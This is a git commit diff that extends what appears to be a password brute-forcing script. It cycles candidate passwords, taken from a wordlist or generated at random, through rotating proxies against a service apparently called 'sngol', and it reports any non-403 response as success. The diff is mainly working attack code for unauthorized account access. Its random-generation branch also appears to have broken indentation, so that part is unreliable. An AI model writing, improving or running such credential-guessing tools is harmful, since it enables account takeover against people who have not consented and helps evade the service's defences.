c4b043540a34d677113ee2ce05edf304d707e6a6
Hyonk Tea <92992858+Hyonk-Tea@users.noreply.github.com>
2024-04-04 19:53:31 -0400

    main.py
    added the password gen code

--- main.py
+++ main.py
@@ -1,6 +1,7 @@
 from sngol import make_request
 from proxy import is_bad_proxy, validate_proxy_list, read_proxy_file
 import random
+import string
 
 using_proxies = True
 print("Reading your proxy list... ", end="")
@@ -35,13 +36,48 @@ else:
     else:
         print(f"{len(proxy_list)} {'proxy' if len(proxy_list) == 1 else 'proxies'} are ready to use!")
 
+def load_wordlist(file_path):
+    try:
+        with open(file_path, 'r') as file:
+            wordlist = file.read().splitlines()
+        return wordlist
+    except FileNotFoundError:
+        return None
 
+def generate_password(charset, length):
+    return ''.join(random.choice(charset) for _ in range(length))
 
-while True:
-    
-    password = "god sngol'd my logns" # replace this with whatever method you use to generate passwords
-    proxy = random.choice(proxy_list)
-    
+wordlist = load_wordlist('wordlist.txt')
+charset = string.ascii_letters + string.digits
+password_length = 8
+
+if wordlist:
+    wordlist_index = 0
+    while True:
+        password = wordlist[wordlist_index]
+        proxy = random.choice(proxy_list)
+        
+        print(f"Checking password {password} with {proxy}...")
+        try:
+            response = make_request(password, proxy)
+            
+            if response.status_code != 403:
+                print(f"Success!!  | {response.text}")
+            else:
+                print(f"Failure :( | {response.text}")
+            
+        except Exception as e:
+            print(f"Something bad happened... {e}")
+            exit()
+
+        wordlist_index += 1
+        if wordlist_index >= len(wordlist):
+            wordlist_index = 0
+else:
+    while True:
+        password = generate_password(charset, password_length)
+        proxy = random.choice(proxy_list)
+        
     print(f"Checking password {password} with {proxy}...")
     try:
         response = make_request(password, proxy)
